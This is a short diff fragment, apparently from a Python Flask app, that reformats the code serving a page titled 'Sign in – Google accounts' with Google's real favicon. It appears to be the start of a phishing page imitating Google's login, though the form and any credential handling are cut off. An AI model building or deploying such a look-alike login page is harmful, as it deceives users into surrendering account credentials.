@@ -1,15 +1,19 @@
-from flask import Flask, request, redirect, send_from_directory        from datetime import datetime
-import os                                                              
-app = Flask(__name__)                                                  
-# Route untuk halaman utama (login page)                               @app.route("/", methods=["GET"])
-def index():                                                               return """
-<!DOCTYPE html>                                                        <html lang="en">
-<head>
+from flask import Flask, request, redirect, send_from_directory
+from datetime import datetime
+import os
+
+app = Flask(__name__)
+                                                                       # Route untuk halaman utama (login page)
+@app.route("/", methods=["GET"])
+def index():
+    return """
+<!DOCTYPE html>
+<html lang="en">                                                       <head>
   <meta charset="UTF-8" />
   <title>Sign in – Google accounts</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="icon" href="https://ssl.gstatic.com/accounts/static/_/ss/k=gaia.gaiafe_main.-1W9vRzc12sE.O/m=gaia_css/favicon.ico" />
-  <style>                                                                  body {
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />                                                                      <link rel="icon" href="https://ssl.gstatic.com/accounts/static/_/ss/k=gaia.gaiafe_main.-1W9vRzc12sE.O/m=gaia_css/favicon.ico" />
+  <style>
+    body {
       font-family: Roboto, Arial, sans-serif;
       background-color: #f2f2f2;
       display: flex;
